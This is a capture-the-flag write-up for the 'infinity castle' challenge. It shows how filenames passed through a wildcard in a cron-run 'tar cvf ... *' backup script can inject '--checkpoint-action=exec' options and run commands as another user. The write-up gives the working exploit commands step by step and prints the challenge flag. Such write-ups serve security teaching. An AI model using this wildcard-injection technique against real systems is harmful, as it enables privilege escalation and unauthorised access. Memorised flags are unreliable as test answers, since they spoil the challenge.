# infinity castle

## Write-up 
The description of this challenge contained a hint on how to solve it, which was to monitor.

Once on the server, if we check the current processes, we can see a script being executed by user zeta (we can't know the frequency, but since it was reapting, it's probably a cron job).

```bash
zeta          84  0.0  0.0   9932  2764 ?        S    16:38   0:00 /bin/bash /tmp/backup
```

**Note** : You can also find the script if you just search in the folders of the server. You will just need to assume that it's being executed afterward.

Now let's check the content of the script.

```bash
#!/bin/bash 

PATH=$(/usr/bin/getconf PATH || /bin/kill $$)

if [ "$(ls -A /home/zeta/work)" ];then 
        cd /home/zeta/work
        tar cvf /home/zeta/backup.tar *
        rm /home/zeta/work/*
fi
sleep 10
```
The line that interests us in this script is this one: 

```bash
tar cvf /home/zeta/backup.tar *
```
The use of wildcard can be critical with some commands, tar is one of those commands. The idea is that tar has some options that let you define and execute some actions at specific checkpoints, so what you can do is give a file an **option** name, so when the tar takes it, it will consider it an option and not a file, thus doing what the options represent.

### Exploit 
The working directory will be `/home/zeta/work`, since it's the folder from which the tar command is taking the files.

1] we will start by preparing the script, since our goal is just to get the flag we don't need to get a shell.

```bash
echo "cat /flag > /tmp/cracked-flag" > shell.sh
```

2] Now we define the action that will be executed at the checkpoint:

```bash
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

3] The last thing is defining the frequency of checkpoints, and since we want our script to get executed immediately, we will make it 1:

```bash
echo "" > --checkpoint=1
```

4] We just wait until Zeta executes the script and triggers our checkpoint.

5] Read the flag:

```bash
cat /tmp/cracked-flag
```

## Flag

`shellmates{T|-|4t_WAS_such_4_*WILD*_C0MM4ND}`
